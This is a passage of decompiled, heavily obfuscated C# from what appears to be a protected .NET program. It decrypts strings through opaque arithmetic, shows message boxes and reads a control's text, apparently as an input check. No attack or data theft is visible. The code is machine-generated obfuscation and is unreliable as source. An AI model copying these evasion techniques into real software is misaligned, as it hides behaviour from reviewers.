			_003CModule_003E.TAIWANLUNISOLAR(ref string_41, array43);
			object[] array44;
			int num50;
			string string_42;
			object[] array45;
			checked
			{
				array44 = new object[Convert.ToInt32(string_41, _003CModule_003E.get_PositiveSign[21] + -42801)];
				array44[~(Convert.ToInt32("ff" + "f4910d", 16) + ~BitwiseOr)] = get_SourceInterface;
				int num49 = default(int);
				switch (unchecked((nint)((Array)(object)string.Empty).LongLength) * -753872)
				{
				case 0:
					num49 = Convert.ToInt32("5bbc9e75", 16) - -239929;
					break;
				}
				num50 = num49;
				string_42 = string.Concat("답담" + "답답담답", "답답답" + "담담담담담" + "담담답담담담답답답답담답담답답답담");
				array45 = new object[Convert.ToInt32("4", 8)];
			}
			array45[385646783 >> array2[43]] = (char)(array[28] * 21);
			array45[Convert.ToInt32("1", 16)] = string.Concat(char.ToString('ɡ'), char.ToString('\u0001') + "\u0002\0\u0002");
			array45[Convert.ToInt32("2ffcc", 16) - 196554] = (byte)((Array)(object)string.Empty).Length != 0;
			array45[checked(Convert.ToInt32("37777777775", 8) * _003CModule_003E.ActivityOptions[5])] = 3864;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_42, array45);
			int num51 = num50 / Convert.ToInt32(string_42, 2);
			char c13 = (char)_003CModule_003E.get_PositiveSign[22];
			string text32 = char.ToString(c13);
			string text33 = char.ToString('\u036c');
			string string_43 = "\ue703\ue69f";
			object[] array46 = new object[6];
			array46[0] = array2[14];
			array46[Convert.ToInt32("1", 16)] = 5910;
			array46[2] = 12161 * sizeof(byte);
			array46[3] = Convert.ToInt32(char.ToString('1') + "1011101100100", 2);
			array46[20 % Convert.ToInt32("8", 16)] = (int)array[13];
			array46[5] = false;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_43, array46);
			array44[num51] = string.Concat(text32, text33 + string_43);
			string string_44 = string.Concat("\u2df9\u2df8", "\u2df9\u2df9", "\u2df9\u2df9\u2df9\u2df8" + "\u2df8\u2df9\u2df8\u2df8\u2df9\u2df9");
			object[] array47 = new object[Convert.ToInt32("3", 16)];
			int num52 = default(int);
			switch (Convert.ToInt32("51369cc0", 16) / _003CModule_003E.ActivityOptions[109])
			{
			case 0:
				num52 = lengths;
				break;
			case 1:
				num52 = 380402;
				break;
			case 2:
				num52 = ((Array)(object)string.Empty).Length;
				break;
			case 3:
				num52 = 729035;
				break;
			}
			array47[num52] = string.Concat(char.ToString('ᔂ'), char.ToString('\u05f6') + "ßȘȝ\a\t");
			array47[1] = 3500;
			int num53 = 0x1EC6C ^ array2[44];
			int num54 = Convert.ToInt32("0", 2);
			array47[num53] = (byte)num54 != 0;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_44, array47);
			string text34 = char.ToString((char)Convert.ToInt32(string_44, 10 % get_ResourceExposureLevel));
			string text35 = char.ToString('ۍ');
			string text36 = char.ToString('\u035e');
			string string_45 = "럮뽌";
			object[] array48 = new object[(nint)((Array)(object)"\u035f\u0345\u0332\u0364\u035a\u032f\u035a\u0347\u0326.\u036d\u0343\u0344\u032e\u031d\u032a\u035f\u033f").LongLength >> 2];
			array48[(nint)((Array)(object)string.Empty).LongLength] = string.Concat(char.ToString('䯬'), char.ToString('䴇') + "ςϵ");
			array48[Convert.ToInt32("1", 16)] = (byte)Convert.ToInt32("0", 8) != 0;
			array48[sizeof(short)] = checked(_003CModule_003E.KeyValuePair__2[120] + -472890);
			array48[_003CModule_003E.KeyValuePair__2[0]] = (char)Marshal.SizeOf(typeof(EncoderExceptionFallbackBuffer));
			_003CModule_003E.TAIWANLUNISOLAR(ref string_45, array48);
			array44[2] = string.Concat(text34, text35, text36 + string_45);
			_003CModule_003E.GetMaxByteCount(ref string_40, array44);
			string text37 = string_40;
			string text38 = char.ToString('\u0016');
			string text39 = char.ToString((char)Convert.ToInt32("61", sizeof(long)));
			string string_46 = "䙻䙽";
			object[] array49 = new object[_003CModule_003E.ActivityOptions[Convert.ToInt32("3", 16)]];
			array49[(uint)array[1]] = 0x3DB & Marshal.SizeOf(typeof(TryFormatInt32));
			array49[Convert.ToInt32("1", 2)] = "ސڛ";
			array49[checked(Stream * 1)] = 1819;
			array49[3] = 'ⴿ';
			_003CModule_003E.TAIWANLUNISOLAR(ref string_46, array49);
			string text40 = text38 + text39 + string_46;
			string text41 = char.ToString('7');
			string text42 = char.ToString((char)array2[array2[23]]);
			string string_47 = "뿴뿇";
			object[] array50 = new object[Marshal.SizeOf(typeof(TupleExtensions)) ^ 0x32BB];
			int num55 = ((0 != array2[1]) ? (-756321) : 0);
			array50[num55] = Convert.ToInt32(char.ToString('1') + char.ToString('0') + "78", sizeof(decimal));
			array50[(uint)array[2]] = 16269;
			array50[2] = 4907;
			array50[3] = 691 << Convert.ToInt32("1", 8);
			array50[4] = 22376;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_47, array50);
			string text43 = text41 + text42 + string_47;
			string text44 = char.ToString((char)(array[29] & '6'));
			string text45 = char.ToString((char)__9__40_0);
			string string_48 = string.Concat(char.ToString('鞇'), char.ToString((char)Marshal.SizeOf(typeof(FindSystemTimeZoneById))), char.ToString('鞟') + "鞉鞚鞍");
			object[] array51 = new object[6];
			char c14 = (char)get_PositiveInfinity;
			array51[(uint)c14] = char.ToString('Ğ') + "\u0003\u0002";
			array51[array2[6] % (nint)((Array)(object)".\u032b").LongLength] = (byte)((Array)(object)string.Empty).Length != 0;
			array51[2] = '愂';
			array51[3] = 25;
			array51[4] = 13141;
			array51[5] = 'ȝ';
			_003CModule_003E.TAIWANLUNISOLAR(ref string_48, array51);
			string string_49 = string.Concat(text40, text43, text44 + text45 + string_48);
			object[] array52 = new object[0xD487 ^ CannotUnloadAppDomainException];
			string string_50 = "\uf44f";
			object[] array53 = new object[PrivateScope % 6];
			array53[array2[1]] = ((-79006 >= Convert.ToInt32("11111111111101100101110001100110", 2)) ? 14932 : Convert.ToInt32("11111111111110000000110010000000", 2));
			array53[Marshal.SizeOf(typeof(UseHebrewParsing))] = 11953;
			array53[(nint)((Array)(object)"\u0308\u033b").LongLength] = "潙ᰟ";
			_003CModule_003E.TAIWANLUNISOLAR(ref string_50, array53);
			array52[0] = (char)Convert.ToInt32(string_50, (1936815284 - Convert.ToInt32("37777275144", 8)) / Marshal.SizeOf(typeof(Write7BitEncodedInt64)));
			array52[1] = (char)_003CModule_003E.LoadVector128[checked(CancellationTokenRegistration - -181273)];
			array52[(902 >> Convert.ToInt32("a", Convert.ToInt32("10000", 2))) | (array2[Convert.ToInt32("10", 16)] - -624075)] = (-171907 + array2[_003CModule_003E.ActivityOptions[14]]) % (_003CModule_003E.KeyValuePair__2[(uint)array[20]] >> _003CModule_003E.KeyValuePair__2[5]);
			int num56 = checked(242821 + array2[45]) * checked(-3 * unchecked((int)array[2]));
			string string_51 = string.Concat(char.ToString('䴷'), char.ToString('䴡') + "䵀䵯䵝乊");
			object[] array54 = new object[(uint)array[3]];
			array54[0] = (byte)checked(_003CModule_003E.ActivityOptions[110] - 671239) != 0;
			array54[1] = (char)checked(Convert.ToInt32("11111111111111111111110101101011", 2) * AsPointer);
			array54[checked(__9__4_0 - -39325)] = Convert.ToInt32("3723", 8) & 0x6E3;
			array54[3] = '\u02fb';
			int num57 = ((array[30] != Convert.ToInt32("37777777352", 8)) ? 4 : 704515);
			array54[num57] = Convert.ToInt32(char.ToString('1') + "10" + "0000101011", 2);
			array54[array2[6]] = Convert.ToInt32("12a9", 16);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_51, array54);
			nint num58 = num56 % (nint)((Array)(object)string_51).LongLength;
			char eDQUOT = (char)EDQUOT;
			array52[num58] = (int)eDQUOT;
			_003CModule_003E.GetMaxByteCount(ref string_49, array52);
			string text46 = string_49;
			int num59 = (array2[1] | 0) % (0x3B3DB & Convert.ToInt32("2cd9f", 16));
			int num60 = 141875 << sizeof(sbyte);
			MessageBox.Show(text37, text46, (MessageBoxButtons)(num59 * num60), (MessageBoxIcon)((~Convert.ToInt32("50", 8) & -2455) + _003CModule_003E.get_PositiveSign[23] % 5118));
		}
		else
		{
			string string_52 = "Ⲛⲽ";
			object[] array55 = new object[5];
			array55[0] = (char)_003CModule_003E.KeyValuePair__2[14];
			array55[1] = (char)Marshal.SizeOf(typeof(INVOCATION_FLAGS_CONSTRUCTOR_INVOKE));
			array55[2] = 1322;
			array55[Marshal.SizeOf(typeof(CharSetMask))] = 4737;
			array55[_003CModule_003E.ActivityOptions[3]] = _003CModule_003E.ActivityOptions[18];
			_003CModule_003E.TAIWANLUNISOLAR(ref string_52, array55);
			string text47 = string_52;
			string text48 = char.ToString('ᄯ');
			string text49 = char.ToString((char)(_003CModule_003E.ActivityOptions[111] >> Marshal.SizeOf(typeof(GetInterfaceImplementation))));
			string text50 = char.ToString('ᄵ');
			string string_53 = string.Concat(char.ToString('\u1c37'), char.ToString('\u1c3a'), char.ToString('᱾') + "\u1c35᰻\u1c27");
			object[] array56 = new object[6];
			array56[0] = (byte)checked(1 * array2[2]) != 0;
			array56[Marshal.SizeOf(typeof(UseHebrewParsing))] = false;
			array56[2] = (int)array[14];
			array56[3] = (int)array[15];
			array56[4] = 50 % Convert.ToInt32("10100", 2);
			IntPtr intPtr2 = (nint)((Array)(object)"\u033b\u0356\u0348\u0366\u0364").LongLength;
			int num61 = ((((array2[46] < -662378) ? 1 : 0) != Convert.ToInt32("0", 16)) ? 810975 : 37);
			array56[(nint)intPtr2] = num61;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_53, array56);
			string string_54 = string.Concat(text47, text48, text49 + text50 + string_53);
			int[] calendarType = _003CModule_003E.CalendarType;
			int num62 = ((-43367 == Convert.ToInt32("37777476522", 8)) ? 900253 : 9);
			object[] array57 = new object[1386 >> calendarType[num62]];
			string string_55 = "싗";
			object[] array58 = new object[4];
			array58[0] = 1392;
			array58[Convert.ToInt32("1", 2)] = 761;
			array58[2] = '멾';
			array58[3] = (byte)((Array)(object)string.Empty).Length != 0;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_55, array58);
			int num63 = Convert.ToInt32(string_55, 2);
			string text51 = char.ToString('f');
			string string_56 = "\uf116\uf116";
			object[] array59 = new object[5];
			array59[0] = _003CModule_003E.get_PositiveSign[Convert.ToInt32("18", 16)];
			array59[(nint)((Array)(object)"\u0365").LongLength] = Marshal.SizeOf(typeof(Cast));
			array59[2] = '᪡';
			array59[3] = 'ᨓ';
			array59[(nint)((Array)(object)(char.ToString('\u0303') + char.ToString('\u036f') + "\u036f\u032c")).LongLength] = false;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_56, array59);
			string value4 = text51 + string_56;
			string string_57 = string.Concat(char.ToString((char)_003CModule_003E.ActivityOptions[112]), char.ToString('챘'), char.ToString('챘') + "챘챘");
			object[] array60 = new object[3];
			array60[(int)array[1] % Convert.ToInt32("fff10fe8", 16)] = (byte)(0xFFFFE8EEu ^ (uint)Convert.ToInt32("37777764356", 8)) != 0;
			array60[Convert.ToInt32("1", 16)] = char.ToString('壦') + "ᑙ㆓";
			array60[checked(946351 - Marshal.SizeOf(typeof(KoreanCalendar)))] = ~Convert.ToInt32("37777751151", 8);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_57, array60);
			array57[num63] = Convert.ToInt32(value4, Convert.ToInt32(string_57, 2));
			string text52 = char.ToString((char)_003CModule_003E.LoadVector128[(nint)((Array)(object)("\u036b\u0325\u036b\u033b" + "\u034d\u0356\u0303\u031f\u0353" + "\u0359\u0318\u031d\u0329\u0312\u0341\u0327\u0320\u031c")).LongLength]);
			string string_58 = "ﵩﵦ";
			object[] array61 = new object[array2[0]];
			int num64 = default(int);
			switch (checked(Convert.ToInt32("0", 2) * 680348))
			{
			case 0:
				num64 = 0;
				break;
			case 1:
				num64 = 187988;
				break;
			case 2:
				num64 = -300901;
				break;
			}
			int num65 = num64;
			char c15 = (char)Convert.ToInt32("30653", 8);
			array61[num65] = (char)(int)c15;
			array61[1] = (char)((uint)array2[47] ^ 0x1FF29u);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_58, array61);
			array57[1] = text52 + string_58;
			string string_59 = "\ufbd1";
			object[] array62 = new object[Convert.ToInt32(char.ToString('1') + "10", array[0])];
			array62[0] = _003CModule_003E.get_PositiveSign[25];
			array62[1] = false;
			array62[3 & _003CModule_003E.ActivityOptions[0]] = 10457;
			array62[(uint)array[4]] = 13918;
			array62[20 % array2[24]] = (char)array2[18];
			array62[5] = '\u09ca';
			_003CModule_003E.TAIWANLUNISOLAR(ref string_59, array62);
			array57[Convert.ToInt32(string_59, 8)] = ShortInlineR;
			string string_60 = "즤";
			object[] array63 = new object[(nint)((Array)(object)"\u0324.").LongLength];
			array63[0] = 40949;
			array63[_003CModule_003E.ActivityOptions[2]] = 10658;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_60, array63);
			string value5 = string_60;
			string string_61 = "厏厎";
			object[] array64 = new object[checked(-273127 - Convert.ToInt32("fffbd516", 16))];
			array64[get_PositiveInfinity] = array[sizeof(decimal)];
			array64[5 % array2[0]] = AssemblyFlags;
			array64[array2[0]] = ((Convert.ToInt32("11111111111111110010001011001010", 2) == -56630) ? 3325 : (-582294));
			_003CModule_003E.TAIWANLUNISOLAR(ref string_61, array64);
			int num66 = Convert.ToInt32(value5, Convert.ToInt32(string_61, AsyncCausalitySynchronousWork % Convert.ToInt32("10", 16)));
			int num67 = Convert.ToInt32("1", 8);
			string text53 = char.ToString((char)num67);
			string string_62 = "\uf040\uf047";
			object[] array65 = new object[(uint)array[(nint)((Array)(object)"\u0369\u0324\u0321\u0352\u0353\u0331").LongLength]];
			array65[0] = (byte)get_PositiveInfinity != 0;
			array65[1] = string.Concat(char.ToString('ư'), char.ToString('T'), char.ToString('\u001a') + "\u0005\u0002");
			array65[Convert.ToInt32("10", Marshal.SizeOf(typeof(ENODATA)))] = 'Д';
			array65[3] = array[Convert.ToInt32("11", 16)];
			array65[array2[5]] = string.Concat("㮖肱", char.ToString('\u0a3b') + char.ToString('۾') + "ڌ\u0a31ࡑ");
			_003CModule_003E.TAIWANLUNISOLAR(ref string_62, array65);
			array57[num66] = text53 + string_62;
			string string_63 = "졧";
			object[] array66 = new object[Convert.ToInt32("110", 2) & 6];
			array66[Convert.ToInt32("0", 16)] = 1529;
			array66[1] = 30150;
			array66[(uint)array[0]] = Marshal.SizeOf(typeof(MaxAcross));
			array66[array2[4]] = string.Concat(char.ToString((char)Convert.ToInt32("5c0", 16)), char.ToString('к'), char.ToString('Œ') + "\u0084\0\u0001\u0002");
			array66[Convert.ToInt32("4", 16)] = 3449;
			array66[array2[25] % 10] = (byte)((Array)(object)string.Empty).Length != 0;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_63, array66);
			int num68 = Convert.ToInt32(string_63, sizeof(decimal));
			string text54 = char.ToString((char)array5[5]);
			string string_64 = "ӕҳ";
			object[] array67 = new object[2 << Marshal.SizeOf(typeof(UseHebrewParsing))];
			array67[Convert.ToInt32("0", _003CModule_003E.ActivityOptions[0])] = (byte)Convert.ToInt32("0", 16) != 0;
			char c16 = (char)Marshal.SizeOf(typeof(UseHebrewParsing));
			array67[(int)c16] = Convert.ToInt32(char.ToString('1') + "89", 16);
			array67[_003CModule_003E.ActivityOptions[Convert.ToInt32("0", 16)]] = 43;
			array67[3] = 'ɦ';
			_003CModule_003E.TAIWANLUNISOLAR(ref string_64, array67);
			array57[num68] = text54 + string_64;
			_003CModule_003E.GetMaxByteCount(ref string_54, array57);
			string text55 = string_54;
			string string_65 = "䑒䑵";
			object[] array68 = new object[-5 * Convert.ToInt32("37777777777", 8)];
			array68[0] = 10280;
			array68[(nint)((Array)(object)"\u0365").LongLength] = char.ToString('Ϯ') + "\u008c\u06da";
			array68[2] = 778;
			array68[_003CModule_003E.KeyValuePair__2[0]] = (byte)((true ? 1u : 0u) & (uint)Convert.ToInt32("0", 8)) != 0;
			array68[4] = 22970;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_65, array68);
			string text56 = string_65;
			char c17 = (char)Convert.ToInt32("152050", 8);
			string text57 = char.ToString(c17);
			string string_66 = "\ua806ꠛ";
			object[] array69 = new object[Convert.ToInt32("5", 16)];
			array69[Convert.ToInt32("0", 2)] = string.Concat(char.ToString('ύ'), char.ToString('5') + "\v\v");
			array69[sizeof(byte)] = 214;
			array69[9486828 / Convert.ToInt32("10010000110000011110110", 2)] = Convert.ToInt32(char.ToString('2') + "310", 8);
			array69[3] = string.Concat(char.ToString('N'), char.ToString('䔪') + char.ToString('Ό') + "ℲΑ\u0329");
			array69[Convert.ToInt32(char.ToString('1') + "00", 2)] = 386;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_66, array69);
			string text58 = text57 + string_66;
			string string_67 = "䒡䓓";
			object[] array70 = new object[5];
			array70[Convert.ToInt32("0", sizeof(char))] = false;
			array70[(uint)array[Stream]] = (char)Convert.ToInt32(char.ToString('3') + "8e", 16);
			int num69 = Convert.ToInt32("2", 16);
			int num70 = ((9269 == Convert.ToInt32("37777650030", 8)) ? 596796 : 609);
			array70[num69] = num70;
			array70[(nint)((Array)(object)(char.ToString('\u0357') + "\u0358\u036c")).LongLength] = _003CModule_003E.KeyValuePair__2[array2[41]];
			array70[4] = (char)Convert.ToInt32(char.ToString('6') + char.ToString('3') + "c1", 16);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_67, array70);
			string text59 = string_67;
			string text60 = char.ToString((char)checked(Convert.ToInt32("fde2", 16) + -10661));
			string string_68 = string.Concat(char.ToString((char)GetIndexOfFirstNonAsciiChar), "泥刺" + "什裏隣梨淋");
			object[] array71 = new object[checked(-3 * _003CModule_003E.ActivityOptions[5])];
			array71[0xDEA18 ^ _003CModule_003E.get_PositiveSign[126]] = '↜';
			array71[1] = 294494 - ComputeHash32;
			array71[_003CModule_003E.ActivityOptions[Convert.ToInt32("0", 8)]] = 'ψ';
			_003CModule_003E.TAIWANLUNISOLAR(ref string_68, array71);
			string string_69 = string.Concat(text56, text58, text59 + text60 + string_68);
			int num71 = ((Convert.ToInt32("254264", 8) == 16822) ? (-743614) : 760126);
			object[] array72 = new object[checked(num71 - (Convert.ToInt32("1346236", 8) << 1)) | _003CModule_003E.Dequeue[Convert.ToInt32("8", array[18])]];
			string string_70 = "峡";
			object[] array73 = new object[Convert.ToInt32("2", 16)];
			array73[0 & Convert.ToInt32("1", 16)] = (char)(Convert.ToInt32("1bd64", 16) % 45608);
			array73[1] = 'ν';
			_003CModule_003E.TAIWANLUNISOLAR(ref string_70, array73);
			int num72 = Convert.ToInt32(string_70, array2[7]);
			int num75;
			int num76;
			checked
			{
				int num73 = -105129 + Convert.ToInt32("11100000101100111", 2);
				int num74 = ((-34676 < array2[48]) ? (-58876) : (-371286));
				num75 = ((num73 == num74) ? Convert.ToInt32(char.ToString('f') + "ffe0f7d", 16) : (-515736));
				num76 = ((array2[49] * -1 >= array2[19]) ? array2[Marshal.SizeOf(typeof(EventCommand))] : (0x2F54F603 | GregorianCalendar));
			}
			array72[num72] = (char)checked(num75 - num76);
			int hasFlagsAttribute2 = HasFlagsAttribute;
			string string_71 = string.Concat(char.ToString('䥄') + "䥄䥄" + "䥄䥄䥄䥄䥄䥄", char.ToString('䥄') + char.ToString('䥄') + "䥄䥄䥄", "䥄䥅" + char.ToString('䥄') + "䥄䥅䥄䥄䥄䥅䥄䥄䥄䥅䥅䥄䥄䥄䥄");
			object[] array74 = new object[0x302D4 ^ Convert.ToInt32("110000001011010110", 2)];
			array74[array2[1]] = string.Concat(char.ToString('Ⲱ'), char.ToString('ѱ'), char.ToString('\n') + ")1");
			array74[array2[Convert.ToInt32("2", 8)]] = _003CModule_003E.get_PositiveSign[26];
			_003CModule_003E.TAIWANLUNISOLAR(ref string_71, array74);
			string value6 = string_71;
			int fromBase = Convert.ToInt32("10", 2);
			array72[hasFlagsAttribute2] = (char)((-56349 == Convert.ToInt32(value6, fromBase)) ? checked(array2[21] * 1) : function);
			char c18 = (char)(Convert.ToInt32("14505274310", 8) / 4369 + -388168);
			array72[sizeof(short)] = (byte)c18 != 0;
			int num77 = 0x3F8EB & array2[22];
			int num78 = default(int);
			switch (array2[50])
			{
			case -246055:
				num78 = -966803;
				break;
			case -246054:
				num78 = Convert.ToInt32("11111111111111111010010101100010", 2);
				break;
			}
			int num80;
			string string_72;
			checked
			{
				int num79 = default(int);
				switch (num77 - unchecked(-792618 - num78))
				{
				case 0:
					num79 = Marshal.SizeOf(typeof(ArrayListDebugView));
					break;
				}
				array72[num79] = 46179;
				num80 = Marshal.SizeOf(typeof(CallConvs));
				string_72 = "떛";
			}
			object[] obj2 = new object[6]
			{
				string.Concat(char.ToString((char)Convert.ToInt32("a61", 16)), char.ToString('ᇎ') + "ʑᐔ"),
				null,
				null,
				null,
				null,
				null
			};
			int num81 = ((array2[51] == -33636) ? 1 : (-637758));
			obj2[num81] = 3457;
			obj2[2] = '⑲';
			int num82 = array2[4];
			obj2[num82] = 4592;
			obj2[~_003CModule_003E.KeyValuePair__2[20]] = (char)_003CModule_003E.KeyValuePair__2[22];
			int num83 = _003CModule_003E.ActivityOptions[1];
			obj2[5] = (byte)num83 != 0;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_72, obj2);
			array72[num80] = 165 * Convert.ToInt32(string_72, 8);
			int num84 = ((Convert.ToInt32("149e1", 16) != 54408) ? 4 : TrailingZeroCount);
			array72[checked(-5 * array5[num84])] = checked(Convert.ToInt32("101100010" + "10000" + "11011000100101011", Convert.ToInt32("10", 2)) - unchecked(array2[52] - 389580)) / _003CModule_003E.Dequeue[11];
			_003CModule_003E.GetMaxByteCount(ref string_69, array72);
			MessageBox.Show(text55, string_69, (MessageBoxButtons)((-273445 - (__9__40_1 ^ -859684)) * -8567), (MessageBoxIcon)sizeof(decimal));
		}
	}

	private unsafe bool Property()
	{
		//IL_2826: Unknown result type (might be due to invalid IL or missing references)
		//IL_38e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_50ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_673d: Unknown result type (might be due to invalid IL or missing references)
		char[] array = new char[37]
		{
			'\u0002', '\0', '\u0001', '\u0006', '\u0003', '\u0004', '\u0005', '\b', '\r', '轛',
			'㹲', '!', '\u02f6', '忔', '䗰', '䬕', 'ᵵ', '\u093e', 'ә', '焾',
			'፹', '\u0010', '\a', '\u0013', 'Ô', 'ֈ', '鯉', '⼮', '漲', 'ࠀ',
			'\udbc1', '\u0a44', '\u07eb', 'ꮵ', '㉘', '㖓', '၅'
		};
		int[] array2 = new int[92]
		{
			2, 0, 1, 3, 5, 16, -19330, 965, 1325, 799,
			5009, 21098, 414986, 325957072, 9992, 12102, 635238, -17089, 19686, 471,
			280, 19843, -12107, 1766, 4938, 685152, 368364, 35368, 43556, -351199,
			1140, 18492436, -471144, 19767, 4862, 15, 8, 4, -5, -3,
			12, 26, 866868112, -410504, -698782, 847354620, 33, -79478, -909209, 274990,
			7928, 205080, 289380, 234927, 862911, -1290610, -125695, 15433, 39396888, 21252,
			1190, 901, -793592, 843596, 353447, 342430249, -89628, -45219, 905, -680612,
			1262678, 589531, 10914, 2112654305, -127425, 963, -457396, -814148, -25468, 976481,
			798259946, 763224956, -900964, 4228, 516683, 27539, -66002, -298365, 639303, 1655,
			-454121, -899041
		};
		char[] array3 = new char[9];
		array3[array2[Marshal.SizeOf(typeof(UseHebrewParsing))]] = '\0';
		array3[(nint)((Array)(object)"\u0306").LongLength] = '\u0001';
		array3[2] = (char)Convert.ToInt32("3", 16);
		array3[3] = (char)Convert.ToInt32("10", 2);
		array3[_003CModule_003E.ActivityOptions[Convert.ToInt32("3", 8)]] = (char)Convert.ToInt32("4", 16);
		array3[862055 - Convert.ToInt32("11010010011101100010", 2)] = '\u0006';
		array3[Convert.ToInt32("6", 8)] = (char)checked(Convert.ToInt32("11111111111101011000101001010000", 2) - Convert.ToInt32("37775300443", 8));
		array3[(nint)((Array)(object)("\u031b\u032e" + "\u0352\u031b\u031e\u034d\u0342")).LongLength] = '獅';
		char c = (char)array2[36];
		array3[(int)c] = array[_003CModule_003E.get_PositiveSign[3]];
		char[] array4 = array3;
		int[] array5 = new int[Convert.ToInt32("12", 8)];
		int num = ((Convert.ToInt32("101100000100011", 2) > Convert.ToInt32("11010101100001111010", 2)) ? 847123 : 0);
		array5[num] = 3;
		array5[-30517 - Convert.ToInt32("11111111111111111000100011001010", 2)] = _003CModule_003E.KeyValuePair__2[121];
		array5[~Convert.ToInt32("37777777775", 8)] = 0;
		array5[_003CModule_003E.KeyValuePair__2[(nint)((Array)(object)string.Empty).LongLength]] = 16;
		array5[array2[42] / Marshal.SizeOf(typeof(CurrentThread))] = 5;
		array5[5] = Convert.ToInt32("102", 8) >> 5;
		array5[6] = Convert.ToInt32("1111111111111" + "1001110100001110010", 2);
		checked
		{
			array5[562027 + _003CModule_003E.ActivityOptions[113]] = array[9];
			array5[8] = -1174946 + _003CModule_003E.KeyValuePair__2[122];
		}
		array5[(nint)((Array)(object)("\u0303\u0313" + char.ToString('\u0359') + "\u0323\u036f\u0332\u0332\u0300\u0323")).LongLength] = -682853;
		int[] array6 = array5;
		UnorderedNotEqualSignaling unorderedNotEqualSignaling = new UnorderedNotEqualSignaling(MultiplyDoublingWideningLowerAndAddSaturate.ResourceLocator);
		string text = ((Control)set_PercentPositivePattern).get_Text();
		string empty = string.Empty;
		System.Console.WriteLine(text);
		string text2 = char.ToString((char)((Convert.ToInt32("37777603273", 8) == -63813) ? '柔' : _003CModule_003E.KeyValuePair__2[123]));
		string text3 = char.ToString('柙');
		string string_ = char.ToString('䫚') + "䫊䫆";
		object[] array7 = new object[5];
		array7[0] = 1242;
		array7[1] = 6259;
		array7[_003CModule_003E.ActivityOptions[(nint)((Array)(object)string.Empty).LongLength]] = 233;
		array7[_003CModule_003E.KeyValuePair__2[0]] = false;
		array7[4] = 3811;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_, array7);
		string text4 = text2 + text3 + string_;
		string string_2 = "ꢡ\ua8b7";
		object[] array8 = new object[5];
		array8[0] = 44740;
		array8[1] = 3618;
		array8[2] = (byte)(~Convert.ToInt32("11111111111111111111111111111111", 2)) != 0;
		array8[3] = checked(array2[43] + 411351);
		array8[sizeof(int)] = TypeKind;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_2, array8);
		string text5 = string_2;
		string string_3 = string.Concat(char.ToString('쟌'), char.ToString('입') + "잋임잖쟍");
		object[] array9 = new object[0x9AE5C ^ Marshal.SizeOf(typeof(get_Scheduler))];
		array9[(int)array[1] / Convert.ToInt32("111010010111000000100011010100", 2)] = "ʱၓ";
		array9[Marshal.SizeOf(typeof(UseHebrewParsing))] = (char)EnumComparer__1;
		array9[2] = (char)Convert.ToInt32("111" + char.ToString('1') + "01001011000", Stream);
		array9[3] = '\u0737';
		_003CModule_003E.TAIWANLUNISOLAR(ref string_3, array9);
		string string_4 = string.Concat(text4, text5 + string_3);
		object[] array10 = new object[~((array2[Convert.ToInt32("6", 8)] > 457967) ? (Convert.ToInt32("f8e4", 16) << 3) : ((Convert.ToInt32("37777654105", 8) == -42939) ? (-6) : 542497))];
		string string_5;
		object[] array11;
		checked
		{
			array10[unchecked(array2[Convert.ToInt32("7", 8)] * checked(698178 + array2[44])) + Popref_popi_popr4] = (-339895 - Midday - 277965) * -4;
			string_5 = "㼣";
			array11 = new object[5];
		}
		array11[0] = (int)array[10];
		array11[_003CModule_003E.ActivityOptions[2]] = (char)Convert.ToInt32("2", 16);
		array11[2] = string.Concat("'\0", char.ToString('\u0001') + char.ToString('\0') + "\0\0\u0002");
		array11[3] = false;
		array11[4] = (char)Convert.ToInt32(char.ToString('1') + "110100", 2);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_5, array11);
		int num2 = Convert.ToInt32(string_5, Convert.ToInt32("10", 2));
		array10[num2] = 8465;
		int num3;
		int num4 = default(int);
		checked
		{
			array10[_003CModule_003E.LoadVector128[2]] = -9687647 * (-828347 - _003CModule_003E.get_PositiveSign[127]) >> get_GenericTypeParameters;
			num3 = Convert.ToInt32(char.ToString('2') + "62700", _003CModule_003E.get_PositiveSign[3]);
			switch (unchecked((int)array[1]) * -24957)
			{
			case 0:
				num4 = _003CModule_003E.get_PositiveSign[128];
				break;
			case 1:
				num4 = Stop;
				break;
			}
		}
		array10[3] = ((num3 == num4) ? (-4129 * Convert.ToInt32("37777777574", 8)) : ExceptionFallback) * (-1 * (Convert.ToInt32("16112564313", 8) / 1898637515));
		int num5 = default(int);
		switch (0 % Convert.ToInt32("11100100100000010110", 2))
		{
		case 0:
			num5 = 4423;
			break;
		}
		string text6 = char.ToString((char)checked(num5 * (0 | get_CurrencyGroupSeparator)));
		string text7 = char.ToString((char)(-228328 + ~get_WrapNonExceptionThrows));
		string text8 = char.ToString((char)(12 << Convert.ToInt32("2", 8)));
		string text9 = char.ToString((char)(array2[45] / _003CModule_003E.ActivityOptions[114]));
		string string_6 = char.ToString('蟂') + "蟃蟀";
		object[] array12 = new object[6];
		array12[Convert.ToInt32("0", 16)] = string.Concat(char.ToString((char)GetTypeInfoCount), char.ToString((char)Convert.ToInt32("10111101", 2)), char.ToString('5') + "\u00040");
		array12[1793391686 / _003CModule_003E.get_PositiveSign[129]] = 6612;
		int num6 = ((60877 != Convert.ToInt32("1010001110110111", 2)) ? Convert.ToInt32("10", 2) : Event);
		array12[num6] = ((-37152 != RuntimeLocalVariableInfo) ? U0 : (-361920));
		array12[3 | array[2]] = char.ToString('ʜ') + char.ToString('Ĝ') + "ĖÖ";
		int num7 = checked(Convert.ToInt32("11111111111111111111111111111110", 2) * -2);
		int num8 = get_PositiveInfinity;
		array12[num7] = (byte)num8 != 0;
